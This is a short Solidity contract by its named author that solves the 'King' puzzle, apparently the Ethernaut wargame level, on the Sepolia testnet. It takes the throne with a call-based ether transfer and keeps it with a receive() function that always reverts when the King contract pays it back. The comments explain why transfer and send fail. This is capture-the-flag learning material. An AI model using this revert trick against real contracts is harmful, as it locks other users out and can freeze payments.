// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Regicide
 * @author Richu A Kuttikattu
 * @notice Contract that solves the king puzzle.
 * The trouble wasn't the submitting instance part: knew that it was just a matter of reverting inside a receive() function
 * The trouble, however, was in becoming King in the first place.
 * All transactions were reverting when using .transfer()and .send() functions. .call() works, and I don't have much idea why!
 *
 *
 * Answer to the question: `transfer` or `send` will fail because of limited 2300 gas stipend.
 * `receive` of King would require more than 2300 gas to execute successfully.
 *
 * Another protip: call in combination with re-entrancy guard is the recommended method to use after December 2019.
 * Contract deployed at 0xF6Dd68a0ACa03BC141541274A3bAaa5626160259 in Sepolia
 */

contract Regicide {
    address kingContractAddress = 0x63F28824DEC7C2403D7dfA2F70F206D1B777B16D;

    // Transaction fails
    function takeTheThroneWithTransfer() public payable {
        payable(kingContractAddress).transfer(msg.value);
    }

    // Transaction fails
    function takeTheThroneWithSend() public payable {
        bool success = payable(kingContractAddress).send(msg.value);
        require(success, "Failed to send Ether");
    }

    // Transaction succeeds, attains Kingship
    function takeTheThroneWithCall() public payable {
        (bool success,) = kingContractAddress.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }

    receive() external payable {
        // The Throne is Mine!!
        if (msg.sender == kingContractAddress) {
            revert();
        }
    }
}
